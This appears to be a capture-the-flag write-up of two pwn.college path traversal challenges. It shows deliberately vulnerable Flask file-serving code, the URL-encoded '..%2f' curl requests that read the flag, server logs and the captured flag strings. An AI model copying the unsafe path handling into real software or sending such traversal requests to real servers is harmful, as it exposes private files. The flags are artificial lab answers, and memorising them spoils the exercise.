# Web Security

## Path Traversal 1

```python
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import flask
import os

app = flask.Flask(__name__)


@app.route("/public", methods=["GET"])
@app.route("/public/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```


```
hacker@web-security~path-traversal-1:~$ curl -v 'http://challenge.localhost/public/..%2f..%2fflag'
* Host challenge.localhost:80 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 57988 failed: Connection refused
*   Trying 127.0.0.1:80...
* Connected to challenge.localhost (127.0.0.1) port 80
* using HTTP/1.x
> GET /public/..%2f..%2fflag HTTP/1.1
> Host: challenge.localhost
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Thu, 23 Oct 2025 21:17:34 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 60
< Connection: close
< 
pwn.college{M4aJtSL8Z_dCgZsa2369eDHnlpD.QX3gzMzwyMyITOyEzW}
* shutting down connection #0
```

```
hacker@web-security~path-traversal-1:~$ /challenge/server 
 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://challenge.localhost:80
Press CTRL+C to quit
DEBUG: requested_path='/challenge/files/index.html'
127.0.0.1 - - [23/Oct/2025 20:53:10] "GET /public HTTP/1.1" 200 -
127.0.0.1 - - [23/Oct/2025 20:53:21] "GET /server HTTP/1.1" 404 -
127.0.0.1 - - [23/Oct/2025 20:53:37] "GET /flag.txt HTTP/1.1" 404 -
127.0.0.1 - - [23/Oct/2025 20:55:01] "GET /flag HTTP/1.1" 404 -
127.0.0.1 - - [23/Oct/2025 20:55:26] "GET /flag HTTP/1.1" 404 -
127.0.0.1 - - [23/Oct/2025 20:55:28] "GET /flag HTTP/1.1" 404 -
127.0.0.1 - - [23/Oct/2025 20:57:03] "GET /flag HTTP/1.1" 404 -
127.0.0.1 - - [23/Oct/2025 20:57:12] "GET /flag HTTP/1.1" 404 -
DEBUG: requested_path='/challenge/files/..'
127.0.0.1 - - [23/Oct/2025 20:57:22] "GET /public%2f.. HTTP/1.1" 500 -
DEBUG: requested_path='/challenge/files/../server'
127.0.0.1 - - [23/Oct/2025 20:58:38] "GET /public%2f..%2fserver HTTP/1.1" 200 -
DEBUG: requested_path='/challenge/files/../../flag'
127.0.0.1 - - [23/Oct/2025 20:59:03] "GET /public%2f..%2f..%2fflag HTTP/1.1" 200 -
```

## Path Traversal 2

```python
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import flask
import os

app = flask.Flask(__name__)


@app.route("/cdn", methods=["GET"])
@app.route("/cdn/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    print(f"DEBUG: {requested_path=}")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))


app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
```

The `strip` method in `python` only takes the border out. We just have to have one directory as prefix.

```
hacker@web-security~path-traversal-2:/challenge$ ls
DESCRIPTION.md  files  server
hacker@web-security~path-traversal-2:/challenge$ ls files
fortunes  index.html
hacker@web-security~path-traversal-2:/challenge$ ls files/fortunes/
fortune-1.txt  fortune-2.txt  fortune-3.txt
hacker@web-security~path-traversal-2:/challenge$ cd
hacker@web-security~path-traversal-2:~$ curl 'http://challenge.localhost/cdn/fortunes/fortune-1.txt'
You can observe a lot just by watching.
                -- Yogi Berra
hacker@web-security~path-traversal-2:~$ curl 'http://challenge.localhost/cdn/fortunes%2f..%2f..%2f..%2fflag'
pwn.college{olO_bJCmzNBOWbSv-X9czlFyrfc.QXyYTN2wyMyITOyEzW}
```

